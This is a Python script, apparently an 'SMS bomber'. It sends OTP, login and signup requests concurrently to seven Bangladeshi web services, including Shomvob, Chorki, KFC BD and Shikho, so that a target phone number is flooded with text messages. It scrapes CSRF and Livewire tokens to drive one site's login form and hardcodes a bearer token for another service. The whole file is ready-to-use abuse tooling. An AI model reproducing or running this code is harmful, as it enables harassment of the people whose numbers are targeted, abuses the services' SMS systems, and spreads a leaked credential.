import asyncio
import aiohttp
import json
import re
import html
import random
import string
import copy

def generate_random_id(length=4):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def format_number_for_file(task_id, base_number):
    if task_id in [1, 2]: return base_number[1:]
    elif task_id == 4: return f"+88{base_number}"
    else: return base_number

async def run_task_1(session, phone_number):
    url = "https://backend-api.shomvob.co/api/v2/otp/phone"
    payload = {"phone": f"880{phone_number}", "is_retry": 0}
    headers = {
        'Authorization': "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    }
    try: await session.post(url, headers=headers, json=payload, timeout=10)
    except: pass

async def run_task_2(session, phone_number):
    url = "https://api-merchant.carrybee.com/api/v2/merchant/register"
    payload = {"name": "Out_of_law", "phone_number": f"+880{phone_number}", "business_name": "out_of_law"}
    try: await session.post(url, json=payload, timeout=10)
    except: pass

async def run_task_3(session, phone_number):
    url = "https://api.apex4u.com/api/auth/login"
    try: await session.post(url, json={"phoneNumber": phone_number}, timeout=10)
    except: pass

async def run_task_4(session, phone_number):
    url = "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en"
    try: await session.post(url, json={"number": phone_number}, timeout=10)
    except: pass

async def run_task_5(phone_number):
    # KFC uses a complex Livewire setup, maintaining cookies via a separate session
    async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar()) as kfc_session:
        try:
            await kfc_session.get("https://kfcbd.com/", timeout=10)
            async with kfc_session.get("https://kfcbd.com/login", timeout=10) as resp:
                text = await resp.text()
                
            csrf_match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', text)
            if not csrf_match: return
            csrf_token = csrf_match.group(1)
            
            lw_matches = re.findall(r'wire:initial-data="([^"]+)"', text)
            initial_data = None
            for match in lw_matches:
                decoded = json.loads(html.unescape(match))
                if decoded.get('fingerprint', {}).get('name') == 'home.login':
                    initial_data = decoded; break
            if not initial_data: return

            headers = {
                'X-CSRF-TOKEN': csrf_token, 'X-Livewire': 'true', 
                'Content-Type': 'application/json'
            }
            api_url = "https://kfcbd.com/livewire/message/home.login"
            
            # Stage 1: Sync Input
            payload_sync = {
                "fingerprint": initial_data["fingerprint"],
                "serverMemo": initial_data["serverMemo"],
                "updates":[{"type": "syncInput", "payload": {"id": generate_random_id(), "name": "mobile", "value": phone_number}}]
            }
            async with kfc_session.post(api_url, headers=headers, json=payload_sync, timeout=10) as res_sync:
                sync_data = await res_sync.json()
                
            updated_serverMemo = copy.deepcopy(initial_data["serverMemo"])
            resp_memo = sync_data.get("serverMemo", {})
            for k, v in resp_memo.items():
                if k == "data" and isinstance(v, dict):
                    for dk, dv in v.items(): updated_serverMemo["data"][dk] = dv
                else: updated_serverMemo[k] = v
            updated_serverMemo["data"]["mobile"] = phone_number

            # Stage 2: Call Login
            payload_login = {
                "fingerprint": initial_data["fingerprint"],
                "serverMemo": updated_serverMemo,
                "updates":[{"type": "callMethod", "payload": {"id": generate_random_id(), "method": "login", "params": []}}]
            }
            await kfc_session.post(api_url, headers=headers, json=payload_login, timeout=10)
        except: pass

async def run_task_6(session, phone_number):
    phone_number = phone_number if phone_number.startswith("88") else f"88{phone_number}"
    check_url = "https://api.shikho.com/auth/v2/user/check"
    auth_type = "signup"
    try:
        async with session.post(check_url, json={"phone": phone_number, "type": "student", "vendor": "shikho"}, timeout=10) as res:
            if res.status == 200:
                data = await res.json()
                if data.get("data", {}).get("is_user_exist"): auth_type = "login"
        
        sms_url = "https://api.shikho.com/auth/v2/send/sms"
        await session.post(sms_url, json={"phone": phone_number, "type": "student", "auth_type": auth_type, "vendor": "shikho"}, timeout=10)
    except: pass

async def run_task_7(session, phone_number):
    url = "https://apialpha.pbs.com.bd/api/OTP/generateOTP"
    try: await session.post(url, json={"userPhone": phone_number, "otp": ""}, timeout=10)
    except: pass

async def trigger_all_bombs(target_number):
    """এটি ব্যাকগ্রাউন্ডে কল হবে এবং ৭টি API একসাথে ফায়ার করবে"""
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/146.0.0.0'}
    async with aiohttp.ClientSession(headers=headers) as session:
        # All tasks running concurrently for maximum speed without blocking
        tasks =[
            run_task_1(session, format_number_for_file(1, target_number)),
            run_task_2(session, format_number_for_file(2, target_number)),
            run_task_3(session, format_number_for_file(3, target_number)),
            run_task_4(session, format_number_for_file(4, target_number)),
            run_task_5(format_number_for_file(5, target_number)), # Uses separate session inside
            run_task_6(session, format_number_for_file(6, target_number)),
            run_task_7(session, format_number_for_file(7, target_number))
        ]
        await asyncio.gather(*tasks)